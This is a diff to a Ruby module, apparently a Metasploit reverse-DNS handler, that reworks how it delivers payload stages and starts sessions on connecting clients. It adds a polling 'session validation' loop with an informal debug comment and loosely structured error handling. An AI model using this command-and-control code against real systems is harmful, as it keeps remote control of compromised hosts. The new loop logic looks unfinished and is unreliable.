@@ -118,25 +118,13 @@ module ReverseDns
           caller
       end
 
-      current_name = "STAGE"
+      need_stage      =  true
+      need_connection =  true
       loop do
         begin          
-          session = nil
-          
-          #If last connection has a valid session or died        
-          if (framework.sessions.length > 0)
-            
-            framework.sessions.each_sorted do |k|
-              session = framework.sessions[k]
-            end 
-            current_name = session.machine_id.to_s
-          else
-            current_name = "STAGE"
-          end
           
           stime = Time.now.to_i
-          
-          if (current_name != "")       
+          if (need_connection == true)       
             
             while (stime + ctimeout > Time.now.to_i)
               begin
@@ -165,6 +153,7 @@ module ReverseDns
             
             # Valid client connection?
             if (client)
+              need_connection = false
               
               # Increment the has connection counter
               self.pending_connections += 1
@@ -188,12 +177,13 @@ module ReverseDns
                 begin 
                   
                   nosess = false
-                  #SEND SERVER_ID
+                  #SEND our SERVER_ID to the DNS 
                   client_copy.put([server_id.length].pack("C") + server_id)
                   conn = client_copy
+                  
                   #First connect,  stage is needed? (or it not the first session and stage alredy there..
                   #    or it is a stageless payload)
-                  if (current_name == "STAGE" and self.payload_type != Msf::Payload::Type::Single) 
+                  if (need_stage == true and self.payload_type != Msf::Payload::Type::Single) 
                     if respond_to? :include_send_uuid
                       if include_send_uuid
                         uuid_raw = conn.get_once(16, 1)
@@ -240,7 +230,25 @@ module ReverseDns
 
                     # Send the stage
                     conn.put(p)
+                    need_stage = false
                   end
+                 
+                  # Session validation #LOGIC IS HERE777#
+                  loop do
+                    begin 
+                      Rex::ThreadSafe.sleep(1)
+                      conn.put("?")
+                      answer = conn.read(1)
+                      
+                      if answer == "\x01"
+                        need_connection = true
+                        break
+                      end
+                    
+                    end
+                  end
+                  
+                  Rex::ThreadSafe.sleep(0.5)
                   
                   #Start the session
                   handle_connection(conn, opts)
